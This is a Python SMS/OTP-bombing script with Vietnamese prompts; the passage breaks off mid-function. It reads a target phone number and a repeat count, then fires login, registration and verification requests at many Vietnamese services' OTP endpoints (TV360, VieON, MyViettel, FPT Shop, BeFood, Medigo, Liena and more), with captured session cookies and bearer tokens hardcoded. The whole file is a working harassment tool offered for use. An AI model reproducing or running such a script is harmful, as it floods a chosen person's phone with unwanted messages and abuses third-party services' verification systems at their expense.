import requests
import time
import urllib3
import random
import string
import concurrent.futures
from colorama import Fore, Style, init
import sys
init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

http = urllib3.PoolManager(
    cert_reqs='CERT_REQUIRED',
    ca_certs='/path/to/your/certificate-authority-bundle-file'
)

# Nhập số điện thoại
sdt = input("Nhập số điện thoại: ")

# Nhập số lần count
count = input("nhập số lẩn:")

# Chuyển count sang kiểu int
try:
    count = int(count)
except ValueError:
    print("Số lần khô ng hợp lệ, vui lòng nhập số.")
    sys.exit()

def sdtt(sdt):
    if sdt.startswith("0"):
        return "+84" + sdt[1:]
    return sdt

sdt_chuyen_doi = sdtt(sdt)

def generate_random_email(domain='example.com'):
    length = random.randint(5, 10)
    email_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    email = f'{email_name}@{domain}'
    return email

random_email = generate_random_email()

def tv360():
    cookies = {
        'img-ext': 'avif',
        'NEXT_LOCALE': 'vi',
        'device-id': 's%3Aweb_d113a986-bdb0-45cd-9638-827d1a7809bb.vUWWw%2BnJUtWclZZ4EpwoSqqe8Z3%2BOEyIWvptoDuLrDk',
        'shared-device-id': 'web_d113a986-bdb0-45cd-9638-827d1a7809bb',
        'screen-size': 's%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q',
        'access-token': '',
        'refresh-token': '',
        'msisdn': '',
        'profile': '',
        'user-id': '',
        'session-id': 's%3Aaba282a7-d30b-4fa2-b4dd-8b1217b1a008.Jg2CyIIRl98IEt0yW76P%2BPy0G79GQOHxw6rA6PTq9BM',
        'G_ENABLED_IDPS': 'google',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': 'img-ext=avif; NEXT_LOCALE=vi; device-id=s%3Aweb_d113a986-bdb0-45cd-9638-827d1a7809bb.vUWWw%2BnJUtWclZZ4EpwoSqqe8Z3%2BOEyIWvptoDuLrDk; shared-device-id=web_d113a986-bdb0-45cd-9638-827d1a7809bb; screen-size=s%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q; access-token=; refresh-token=; msisdn=; profile=; user-id=; session-id=s%3Aaba282a7-d30b-4fa2-b4dd-8b1217b1a008.Jg2CyIIRl98IEt0yW76P%2BPy0G79GQOHxw6rA6PTq9BM; G_ENABLED_IDPS=google',
        'origin': 'https://tv360.vn',
        'priority': 'u=1, i',
        'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'starttime': '1721479947788',
        'tz': 'Asia/Bangkok',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'msisdn': sdt,
    }

    try:
        response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TV360 | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TV360 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vieon():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjE2OTc2NzcsImp0aSI6IjM2YTYxOGU4ZmNlMzlmNzVkZjJhZDk1Mjg5YWE3OTk5IiwiYXVkIjoiIiwiaWF0IjoxNzIxNTI0ODc3LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTcyMTUyNDg3Niwic3ViIjoiYW5vbnltb3VzXzI1MjhiYWQ3MWJiYmY5ODg4ODJhYTcyZmRiMTA1Mzg0LWNlM2FjYzc2ODdlNmVjNWRhZGJiN2E1N2YzMWE0YTBkLTE3MjE1MjQ4NzciLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiMjUyOGJhZDcxYmJiZjk4ODg4MmFhNzJmZGIxMDUzODQtY2UzYWNjNzY4N2U2ZWM1ZGFkYmI3YTU3ZjMxYTRhMGQtMTcyMTUyNDg3NyIsInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNi4wLjAuMCBTYWZhcmkvNTM3LjM2IE9QUi8xMTIuMC4wLjAiLCJkdCI6IndlYiIsIm10aCI6ImFub255bW91c19sb2dpbiIsIm1kIjoiV2luZG93cyAxMCIsImlzcHJlIjowLCJ2ZXJzaW9uIjoiIn0.wXtslFrAOKsPxT41wnkXvzY7K1AocvJykB4eI0jnesY',
        'content-type': 'application/json',
        'origin': 'https://vieon.vn',
        'priority': 'u=1, i',
        'referer': 'https://vieon.vn/auth/?destination=/&page=/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'platform': 'web',
        'ui': '012021',
    }

    json_data = {
        'username': sdt,
        'country_code': 'VN',
        'model': 'Windows 10',
        'device_id': '2528bad71bbbf988882aa72fdb105384',
        'device_name': 'Opera/112',
        'device_type': 'desktop',
        'platform': 'web',
        'ui': '012021',
    }

    try:
        response = requests.post('https://api.vieon.vn/backend/user/v2/register', params=params, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIEON | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIEON | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

if count > 9998888:
    count = 99999989

def myviettel():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        # 'content-length': '0',
        'origin': 'https://vietteltelecom.vn',
        'priority': 'u=1, i',
        'referer': 'https://vietteltelecom.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
    }

    try:
        response = requests.post(
            f'https://apigami.viettel.vn/mvt-api/myviettel.php/getOTPLoginCommon?lang=vi&phone={sdt}&actionCode=myviettel:%2F%2Flogin_mobile&typeCode=DI_DONG&type=otp_login',
            headers=headers,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MYVIETTEL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MYVIETTEL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def fptshop():
    headers = {
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'Content-Type': 'application/json',
        'Referer': 'https://fptshop.com.vn/',
        'order-channel': '1',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'fromSys': 'WEBKHICT',
        'otpType': '0',
        'phoneNumber': sdt,
    }

    try:
        response = requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FPTSHOP | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FPTSHOP | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)


def befood():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'app_version': '11261',
        'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjowLCJhdWQiOiJndWVzdCIsImV4cCI6MTcyMTY2NjE0MiwiaWF0IjoxNzIxNTc5NzQyLCJpc3MiOiJiZS1kZWxpdmVyeS1nYXRld2F5In0.hTY2ucbYZBKKCNsUaypZ1fyjVSmAN77YjfP2Iyyrs1Y',
        'content-type': 'application/json',
        'origin': 'https://food.be.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://food.be.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone_no': sdt_chuyen_doi,
        'uuid': '6b83df66-d9ad-4ef0-86d9-a235c5e83aa7',
        'is_from_food': True,
        'is_forgot_pin': False,
        'locale': 'vi',
        'app_version': '11261',
        'version': '1.1.261',
        'device_type': 3,
        'operator_token': '0b28e008bc323838f5ec84f718ef11e6',
        'customer_package_name': 'xyz.be.food',
        'device_token': '2a5886db48531ea9feb406f8801a3edd',
        'ad_id': '',
        'screen_width': 360,
        'screen_height': 640,
        'client_info': {
            'locale': 'vi',
            'app_version': '11261',
            'version': '1.1.261',
            'device_type': 3,
            'operator_token': '0b28e008bc323838f5ec84f718ef11e6',
            'customer_package_name': 'xyz.be.food',
            'device_token': '2a5886db48531ea9feb406f8801a3edd',
            'ad_id': '',
            'screen_width': 360,
            'screen_height': 640,
        },
        'latitude': 10.77253621500006,
        'longitude': 106.69798153800008,
    }

    try:
        response = requests.post('https://gw.be.com.vn/api/v1/be-delivery-gateway/user/login', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BEFOOD | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BEFOOD | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def foodhubzl(): # check ap
    cookies = {
        'tick_session': 'f0s3e78s49netpa8583ggjedo5fiabkj',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'tick_session=f0s3e78s49netpa8583ggjedo5fiabkj',
        'Origin': 'https://account.ab-id.net',
        'Referer': 'https://account.ab-id.net/auth/login?token=73f53f54d63b6caa9fb7b90f0007b72a52be1849b00a35d599fb002c22701563&destination=https://www.foodhub.vn',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'access_token': '73f53f54d63b6caa9fb7b90f0007b72a52be1849b00a35d599fb002c22701563',
        'destination': 'https://www.foodhub.vn',
        'site_token': '',
        'phone_number': sdt,
        'remember_account': '1',
        'type': 'zalootp',
        'country': '+84',
        'country_code': 'VN',
    }

    try:
        response = requests.post('https://account.ab-id.net/auth/get_form_phone_code', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FOODHUBZL ABAHA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FOODHUBZL ABAHA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vttelecom():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'content-length': '0',
        'origin': 'https://vietteltelecom.vn',
        'priority': 'u=1, i',
        'referer': 'https://vietteltelecom.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'lang': 'vi',
        'msisdn': sdt,
        'type': 'register',
    }

    response = requests.post('https://apigami.viettel.vn/mvt-api/myviettel.php/getOtp', params=params, headers=headers)

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'content-length': '0',
        'origin': 'https://vietteltelecom.vn',
        'priority': 'u=1, i',
        'referer': 'https://vietteltelecom.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    try:
        response = requests.post(
            f'https://apigami.viettel.vn/mvt-api/myviettel.php/getOTPLoginCommon?lang=vi&phone={sdt}&actionCode=myviettel:%2F%2Flogin_mobile&typeCode=DI_DONG&type=otp_login',
            headers=headers,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VTTELECOM | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VTTELECOM | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vinwonders():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://booking.vinwonders.com',
        'priority': 'u=1, i',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'channel': 10,
        'UserName': sdt_chuyen_doi,
        'Type': 1,
        'OtpChannel': 1,
    }

    try:
        response = requests.post(
            'https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VINWONDERS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VINWONDERS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def hasaki():
    cookies = {
        'sessionChecked': '1733243335',
        'HASAKI_SESSID': 'b4f9a3141d969a5e713baeeb62cddecc',
        'form_key': 'b4f9a3141d969a5e713baeeb62cddecc',
        'utm_hsk': '%7B%22utm_source%22%3Anull%2C%22utm_medium%22%3Anull%2C%22utm_campaign%22%3Anull%2C%22utm_term%22%3Anull%7D',
        'PHPSESSID': 'd7q25iv138vv8kvqi4saublpbk',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'cookie': 'sessionChecked=1721624886; HASAKI_SESSID=b5a41e810a240f4d2446e6241c78407a; form_key=b5a41e810a240f4d2446e6241c78407a; utm_hsk=%7B%22utm_source%22%3Anull%2C%22utm_medium%22%3Anull%2C%22utm_campaign%22%3Anull%2C%22utm_term%22%3Anull%7D; PHPSESSID=ofu3g6vsn92b0iqiu4i28e82s0',
        'priority': 'u=1, i',
        'referer': 'https://hasaki.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'api': 'user.verifyUserName',
        'username': sdt,
    }

    try:
        response = requests.get('https://hasaki.vn/ajax', params=params, cookies=cookies, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HASAKI.VN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HASAKI.VN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)


def fahasa():
    cookies = {
        'frontend': '732d867ee6ea46ea86186fd679b0607a',
        'utm_source': 'google',
        'frontend_cid': '85UO0HdWkJWztVfl',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'frontend=732d867ee6ea46ea86186fd679b0607a; utm_source=google; frontend_cid=85UO0HdWkJWztVfl',
        'origin': 'https://www.fahasa.com',
        'priority': 'u=1, i',
        'referer': 'https://www.fahasa.com/customer/account/login/referer/aHR0cHM6Ly93d3cuZmFoYXNhLmNvbS9jdXN0b21lci9hY2NvdW50L2luZGV4Lw,,/',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FAHASA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FAHASA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL) 

def medigozl():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://www.medigoapp.com',
        'priority': 'u=1, i',
        'referer': 'https://www.medigoapp.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'from': 'ZALO',
    }

    json_data = {
        'phone': sdt_chuyen_doi,
    }

    try:
        response = requests.post('https://auth.medigoapp.com/prod/getOtp', params=params, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MEDIGOZL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MEDIGOZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)


def medigosms():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://www.medigoapp.com',
        'priority': 'u=1, i',
        'referer': 'https://www.medigoapp.com/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    json_data = {
        'phone': sdt_chuyen_doi,
    }

    try:
        response = requests.post('https://auth.medigoapp.com/prod/getOtp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MEDIGOSMS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MEDIGOSMS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def mocha(): #ap check
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        # 'Content-Length': '0',
        'Origin': 'https://video.mocha.com.vn',
        'Referer': 'https://video.mocha.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'msisdn': sdt,
        'languageCode': 'vi',
    }

    try:
        response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MOCHA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MOCHA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def liena():
    cookies = {
        'form_key': '16TAQkcEJWNL9mpA',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'mage-messages': '',
        'PHPSESSID': 'dc89004ebe3f7d6ddcf4413416fe8486',
    }

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        # 'cookie': 'form_key=16TAQkcEJWNL9mpA; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; PHPSESSID=dc89004ebe3f7d6ddcf4413416fe8486',
        'origin': 'https://www.liena.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.liena.com.vn/?gad_source=1&gclid=CjwKCAjw9eO3BhBNEiwAoc0-jTqAbel8_7VQKkVBrv--8QcKLRdxat-thOoWRBU8OQYaV6eYP3LvqhoC7vQQAvD_BwE',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Opera";v="113", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 OPR/113.0.0.0',
    }

    json_data = {
        'phone_number': sdt,
    }

    try:
        response = requests.post(
            'https://www.liena.com.vn/rest/V1/liena/customer/login/request-otp',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("LIENA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("LIENA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def viettelpost():
    cookies = {
        'QUIZIZZ_WS_COOKIE': 'id_192.168.12.141_15001',
        '.AspNetCore.Antiforgery.XvyenbqPRmk': 'CfDJ8ASZJlA33dJMoWx8wnezdv-ldmCeCauiRwoNjbMuIi_12RwO7MX0bWiH1o0iU8D3b4WYfRUPQnjqeIiIpn3XmYRFi_KAJ99Y0oUQzmpZyla6brgkixhji6p2GHBun7BmyV5E_Ktge00TOT2nKbyulVM',
        '_gid': 'GA1.2.766667119.1722475009',
        '_ga_P86KBF64TN': 'GS1.1.1722475009.1.1.1722475193.0.0.0',
        '_ga_7RZCEBC0S6': 'GS1.1.1722475008.1.1.1722475193.0.0.0',
        '_ga': 'GA1.1.283730043.1722475009',
        '_ga_WN26X24M50': 'GS1.1.1722475008.1.1.1722475193.0.0.0',
    }

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Cookie': 'QUIZIZZ_WS_COOKIE=id_192.168.12.141_15001; .AspNetCore.Antiforgery.XvyenbqPRmk=CfDJ8ASZJlA33dJMoWx8wnezdv-ldmCeCauiRwoNjbMuIi_12RwO7MX0bWiH1o0iU8D3b4WYfRUPQnjqeIiIpn3XmYRFi_KAJ99Y0oUQzmpZyla6brgkixhji6p2GHBun7BmyV5E_Ktge00TOT2nKbyulVM; _gid=GA1.2.766667119.1722475009; _ga_P86KBF64TN=GS1.1.1722475009.1.1.1722475193.0.0.0; _ga_7RZCEBC0S6=GS1.1.1722475008.1.1.1722475193.0.0.0; _ga=GA1.1.283730043.1722475009; _ga_WN26X24M50=GS1.1.1722475008.1.1.1722475193.0.0.0',
        'Origin': 'null',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'FormVerifyOtpModel.Phone': '',
        'FormVerifyOtpModel.Email': '',
        'FormVerifyOtpModel.Password': '',
        'FormVerifyOtpModel.UserId': '',
        'FormForgotPassword.Email': '',
        'FormForgotPassword.UserId': '',
